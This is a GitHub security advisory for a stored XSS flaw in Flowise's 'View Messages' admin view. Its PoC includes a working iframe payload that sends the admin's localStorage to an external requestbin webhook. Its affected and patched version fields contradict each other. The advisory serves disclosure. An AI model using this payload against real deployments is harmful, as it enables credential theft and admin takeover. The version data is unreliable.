# [C] Flowise is vulnerable to stored XSS via "View Messages" allows credential theft in FlowiseAI admin panel

## Summary
Severity: Critical
Advisory: GHSA-964p-j4gg-mhwc
CVE: CVE-2025-50538
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2025-10-03
Source: https://github.com/advisories/GHSA-964p-j4gg-mhwc
Type: github-advisory

## Affected
- npm: `flowise` — affected >=0 <3.0.8

## Details
### Summary
A stored Cross-Site Scripting (XSS) vulnerability in FlowiseAI allows a user to inject arbitrary JavaScript code via message input. When an administrator views messages using the "View Messages" button in the workflow UI, the malicious script executes in the context of the admin’s browser, enabling credential theft via access to `localStorage`.

---

### Details
The vulnerability stems from a lack of input sanitization when displaying stored user messages in the admin interface. A specially crafted payload using `<iframe srcdoc="...">` can include arbitrary JavaScript, which is executed when the message is rendered.

---

### PoC
1. Deploy a FlowiseAI agent and make it accessible via browser (e.g., embed on a website).
2. Send the following payload via the agent's chat interface:
   ```html
   <iframe srcdoc="<script>fetch('http://requestbin.whapi.cloud/XXXXX?d='+encodeURIComponent(JSON.stringify(localStorage)))</script>">
   ```
3. As an admin, go to the workflow and click **"View Messages"**.
4. The JavaScript is executed in the admin's browser, exfiltrating `localStorage` content to the attacker-controlled webhook endpoint.

---

### Impact
- **Type:** Stored Cross-Site Scripting (XSS)
- **Who is impacted:** Any admin viewing messages in the FlowiseAI UI
- **Data at risk:** Admin credentials, or sensitive info stored in `localStorage`
- **Severity:** High (Account takeover, admin privilege escalation, full panel compromise)

---

### Affected Products
- **Ecosystem:** `npm`
- **Package name:** `flowise`
- **Affected versions:** `< 2.2.7`
- **Patched versions:**`1`

## References
- https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-964p-j4gg-mhwc
- https://nvd.nist.gov/vuln/detail/CVE-2025-50538
- https://github.com/FlowiseAI/Flowise/pull/4905
- https://github.com/FlowiseAI/Flowise/commit/9a06a85a8ddcbaeca1342827a5fea9087a587d97
- https://github.com/FlowiseAI/Flowise
- https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.0.5
